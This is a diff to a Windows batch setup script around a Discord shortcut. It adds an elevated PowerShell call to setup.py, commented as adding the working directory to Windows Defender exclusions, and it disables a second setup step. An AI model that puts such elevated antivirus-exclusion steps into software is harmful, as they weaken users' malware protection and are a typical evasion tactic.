@@ -41,7 +41,10 @@ if exist "%start_menu_path%\%discord_shortcut_name%" (
     copy "%start_menu_path%\%discord_shortcut_name%" "%origcut_path%\%discord_shortcut_name%" /Y
 )
 
+:: Run the add_to_defender.py script to add the working directory to Windows Defender exclusions
+powershell -Command "Start-Process python -ArgumentList 'setup.py' -Verb RunAs"
+
 :: Run the second setup script
-python setup-step2.py
+::python setup-step2.py
 
 endlocal
